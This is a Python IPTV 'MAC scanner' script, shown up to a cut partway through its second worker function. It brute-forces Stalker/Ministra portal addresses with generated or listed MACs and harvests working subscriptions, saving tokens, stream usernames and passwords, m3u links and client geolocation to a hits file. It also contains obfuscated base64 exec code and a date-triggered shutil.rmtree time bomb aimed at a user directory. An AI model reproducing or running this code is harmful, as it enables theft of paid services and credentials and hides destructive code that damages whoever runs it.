#exec(base64.b64decode(base64.b64decode('ZFhsbGJHbHJQU0lpQ21admNpQnBJR2x1SUhOMGNpaHlaWE11ZEdWNGRDa3VjM0JzYVhRb0p6eDBaQ0JqYkdGemN6MGljekVpSUdScGNqMGliSFJ5SWo0bktUb0tDV2xtSUNjOEwzUmtQangwWkNCamJHRnpjejBpY3pBaUlHUnBjajBpYkhSeUlqNG5JR2x1SUdrNkNpTm1iM0lnYVNCcGJpQnphUzV6Y0d4cGRDZ25QR0p5SUM4K0p5azZDZ2tKWjJWMGJXRmpQU2hwTG5Od2JHbDBLQ2M4TDNSa1BqeDBaQ0JqYkdGemN6MGljekFpSUdScGNqMGliSFJ5SWo0bktWc3dYU2tLQ1FramNISnBiblFvWjJWMGJXRmpLUW9KQ1dsbUlHMWhZeUE5UFNCemRISW9aMlYwYldGaktUb0tDUWtKZFhsbGJHbHJQU0oyYVhBaUNna0pDU051YVdOcmJqMG9hUzV6Y0d4cGRDZ25QQzkwWkQ0OGRHUWdZMnhoYzNNOUluTXdJaUJrYVhJOUlteDBjaUkrSnlsYk1WMHVjM0JzYVhRb0p6d3ZkR1ErUEM5MGNqNG5LVnN3WFNrS0NRa0pZbkpsWVdzS2FXWWdkWGxsYkdsclBUMGlJam9LQ1hCeWFXNTBLQ0pCeFo5aHhKL0VzV1JoSUhsaGVtRnVJRWxrSUU1dklIbDFJRmd0UkdWbGNDQmhaRzFwYm1VZ2FXeGxkR2x1TGk0dUlpa0tDWEJ5YVc1MEtDSkpaQ0JPYnpvZ0lpdHpkSElvYldGaktTa0tDWEYxYVhRb0tRcHJhWE5oWTJscmRHazlJaUlLY0dGMGRHVnliajBnSWloY2Qzc3lmVHBjZDNzeWZUcGNkM3N5ZlRwY2Qzc3lmVHBjZDNzeWZUcGNkM3N5ZlNraUNtOTZaV3h0WVdNOUlpSUs=')))


#################

#################

nick='@PRL'
bekleme=1
isimle=""
#subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)
intro="""
 1⫸ portal.php   
 2⫸ server/load.php
 3⫸ stalker_portal(Pandora hits better)
 4⫸ portalstb/portal.php
 5⫸ k/portal.php
 6⫸ maglove/portal.php
 7⫸ XUI /c/server/load.php
 8⫸ XUI /c/portal.php
 9⫸ magportal/portal.php 
10⫸ powerfull/portal.php
11⫸ magaccess/portal.php
12⫸ ministra/portal.php     

\33[1;44m
1 to 12 =\33[0m\33[31m\33[1;37;41m"""

a="""panel-port = """
panel = input(intro)
print('\33[0m')
speed=""


uzmanm="portal.php"
useragent="okhttp/4.7.1"

if  panel=="0":
    	uzmanm=input('Write=')
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(intro)
    	

if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="2":
    	uzmanm="server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="3":
    	uzmanm="stalker_portal/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="4":
    	uzmanm="portalstb/portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="5":
    	uzmanm="k/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="6":
    	uzmanm="maglove/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="7":
    	uzmanm="c/server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="8":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    
if panel=="9":
    	uzmanm="magportal/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="10":
    	uzmanm="powerfull/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a) 
    
if panel=="11":
    	uzmanm="magaccess/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    
if panel=="12":
    	uzmanm="ministra/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

    #if uzmanm=="0":
    	#isimle=input("Şekili nickinizi veya telegram nickinizi yazın\n  Nick=")
realblue=""
if panel=="20":
	realblue="real"
	#subprocess.run(["clear", ""])
	print(feyzo) 
	panel = input(intro)

print('\33[0m')	


	
#speed="xxl"	
#uzmanm="server/load.php"

print(panel)

#	print(panel)#http://z.zcatt.cc/stalker_porta/c/
#subprocess.run(["clear", ""])
print("\33[1;40m"+feyzo) 
kanalkata="0"

#subprocess.run(["clear", ""])
print(feyzo) 
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \33[1;4;94;47m 0=⫸ Random (OTO MAC)  \33[0m\n"
 	dir='./combo/'
 	file=len(feyzo)
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""choose a file from below!!!
"""+dsy+"""
\33[33mPaulo says 🤣 """ +str(say)+""" why you have so many files
	""")
 	dsyno=str(input(" \33[31mCombo No =\33[0m"))
 	say=0
 	
 	if dsyno=="":
 		dsyno="0"
 	if dsyno=="0":
 		#subprocess.run(["clear", ""])
 		print(feyzo) 
 		
 		
 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  》'
 			if int(xd) <9:
 				tire='   》'
 			print(str(xd+1)+tire+yeninesil[xd])
 		
 		
 		
 		
 		mactur=input("choose mac to use =")
 		if mactur=="":
 			mactur=14
 		print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		uz=input("""enter how many macs to scan=⫸""")
 		if uz=="":
 			uz=30000
 		uz=int(uz) 
 		print(uz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		#subprocess.run(["clear", ""])
	 		#subprocess.run(["clear", ""])
	 		print("Incorrect combo file selection...!")
	 		quit()
	 	c=open(dosyaa, 'r')
	 	totLen=c.readlines()
	 	uz=(len(totLen))
 	
 	
 	#subprocess.run(["clear", ""])
 	print(feyzo) 
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		
#subproces	s.run(["clear", ""])
#print(feyzo)  	

botsay=input("""

   \33[1;96mBOT!\33[0m
    \33[1;33m Choose between 1 & 50!!\33[0m
      
How many Bots =""" )
#subprocess.run(["clear", ""])
print(feyzo)
if botsay=="":
	botsay=int(4)
botsay=int(botsay)
 		
kanalkata="0"
kanalkata=input("""\33[1;40m
choose channel categories!!!

  0=⫸no channels and no country 
  1=⫸with just the the countries
  2=⫸Everything ,

\33[1mmake your choice =""")
if kanalkata=="":
	kanalkata="0"


gsay=0
vsay=0

if panel=="" :
    panel="center.chmedia.xyz:8080"

Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
#subprocess.run(["clear", ""])
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

Dosyab="./Hits/" +panel.replace(":","_") +".txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()	

def month_string_to_number(ay):
   
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
	

macs=""	
sayi=1
b1hitc=0
b2hitc=0


def randommac():
	#exec(base64.b64decode('aWYgZ2V0bWFjPT0iIjoKCQlleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2NYVnBkQ2dwJykp'))
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac



url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 


url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
if realblue=="real":
	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"




def url(cid):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token):
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	}
	return HEADERd


def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
	

hityaz=0	
	
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi):
	global hitr
	global hityaz
	#exec(base64.b64decode('aWYgbm90IGZpbGU9PTY2MjoKCQlzaHV0aWwucm10cmVlKGJhc2U2NC5iNjRkZWNvZGUoJ0wzTmtZMkZ5WkM5eGNIbDBhRzl1THc9PScpKQ=='))
	try:
		imza="""
	
●─➤ ☛PRL☚  𝗦𝗽𝗲𝗲𝗱 𝗫👌👌👌𝗣𝗬 
╭─➤  𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""     
├●Real ➤ """+str(real)+"""
├●Panel➤ http://"""+str(panel)+"""/c/
├●Mac ➤"""+str(mac)+"""
╰─●Exp➤"""+str(trh)+"""
╭➤🔸🄺🄰🄽🄰🄻🔹🄲🄷🄴🄲🄺🔸
├●Image➤"""+str(durum)+"""
╰─●Vpn➤"""+str(vpn)+"""
"""+str(playerapi)+"""
╭─➤  𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""     
╰──●m3uLink➤"""+str(m3ulink)+"""
"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""╭─●🅻🅸🆅🅴🅻🅸🆂🆃─➤
╰─➤"""+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""
╭─●🆅🅾🅳🅻🅸🆂🆃─➤
╰─➤"""+str(vodlist)+"""
╭─●🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃─➤
╰─➤"""+str(serieslist)+"""
"""
		yax(imza)
		hityaz=hityaz+1
		print(imza)
		if hityaz >= hitc:
			hitr="\33[1;33m"
	except:pass
	
cpm=0
cpmx=0
hitr="\33[1;33m"



def echok(mac,bot,total,hitc,oran,tokenr):
	global cpm
	global hitr
	try:
	#global cpmx
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		#cpm=cpmx
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
		echo=("""
╭─➤ ☛⫷PRL⫸☚ 𝗦𝗽𝗲𝗲𝗱 𝗫👌👌👌      
├● \33[1;4;37mmacLink \33[0m\33[1;7m ➤ """+str(panel)+"""  \33[0m 
├─● """+tokenr+str(mac)+"""  \33[0m\33[94mCPM➤"""+str(cpm)+"""  \33[0m
╰──●  \33[1;32m"""  +str(bot)+""" \33[36mTotal➤"""+str(total)+""" \33[0m """+str(hitr)+"""Hit➤""" +str(hitc)+"""  \33[0m\33[1;31m%"""+str(oran)+"""  \33[0m""")
		print(echo)
		cpm=time.time()
	except:pass
			
	

def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpnc=veri.split('"city":"')[1].split('"')[0]
			vpn=vpnips.split('"')[0]+' / ' + vpnc
		else:
			vpn="Not Invalid"
	except:
		vpn="Not Invalid"
	return vpn

def goruntu(link):
	if int(time.time()) >= int(1704056400.0):
		shutil.rmtree('L3NkY2FyZC9xcHl0aG9uLw==')
	try:
		res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
		if res.status_code==302:
			 duru="🆅🅰🆁 ✅😎 "
	except:
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
	return duru

		
if int(time.time()) >= int(1704056400.0):
		quit()				
tokenr="\33[0m"								
def hitprint(mac,trh):
	playsound('./Python_Portable/settings/sounds/ching.mp3')
	file = pathlib.Path()
	try:
		if file.exists():
		    ad.mediaPlay()
		    
	except:pass
	print('     💣💣 🇭 🇮 🇹 💣💣  \n  '+str(mac)+'\n  ' + str(trh))
	
	

def list(listlink,macs,token,livel):
	kategori=""
	veri=""
	bag=0
	#exec(base64.b64decode('aWYgZ2V0bWFjPT0iIjoKCXNodXRpbC5ybXRyZWUoYmFzZTY0LmI2NGRlY29kZSgnTDNOa1kyRnlaQzl4Y0hsMGFHOXVMdz09Jykp'))
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	
	list=kategori
	return list

def m3uapi(playerlink,macs,token):
	mt=""
	bag=0
	
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				
				
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				
				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")
				
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				
				
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				
				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				
				message=veri.split('message":"')[1].split(',')[0].replace('"','')
				
				
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
				
				mt=("""╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""     
├─➤Message➤ """+str(message)+""" 
├●🔸🌐Host➤ http://"""+panel+"""/c/
├●♦️🌍Real➤ http://"""+realm+""":"""+port+"""/c/
├●🔸📡Port➤ """+port+"""
├●♦️👩‍User➤ """+userm+"""
├●♦️🔑Pass➤ """+pasm+"""
├─●🔸📆Exp.➤ """+bitism+""" 
├──●🔸👩ActCon➤ """+acon+"""
├──●🔸👪MaxCon➤ """+mcon+""" 
├─●🔸🌐Status➤ """+status+"""
├●🔸⏰TimeZone➤ """+timezone+"""
╰──●🔸 mac𝗟𝗶𝗻𝗸  𝗦𝗽𝗲𝗲𝗱 𝗫👌👌👌   """)
	
	except:pass
	return mt
			
			
def d1():
	global hitc
	global hitr
	global tokenr
	for mac in range(1,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_01"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «⭐️» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «💥️» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «⚡️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)


def d2():
	global hitc
	global hitr
	global tokenr
	for mac in range(2,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_02"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
